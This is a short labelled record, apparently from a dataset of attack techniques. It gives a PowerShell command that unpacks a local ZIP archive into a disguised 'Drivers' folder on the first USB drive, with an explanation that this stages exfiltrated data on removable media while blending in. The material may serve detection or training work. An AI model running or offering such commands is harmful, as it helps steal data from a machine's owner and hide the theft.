command: $dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path "$dl:\Drivers" -ItemType Directory -Force | Out-Null; Expand-Archive -Path "C:\ProgramData\drivers_cache.zip" -DestinationPath "$dl:\Drivers" -Force
explanation: Expands a cache ZIP into a drivers-themed directory on the USB to blend in while staging exfiltrated content on removable media.
rationale_steps: Create a plausible directory on the USB.
Extract a local archive directly to the USB device.
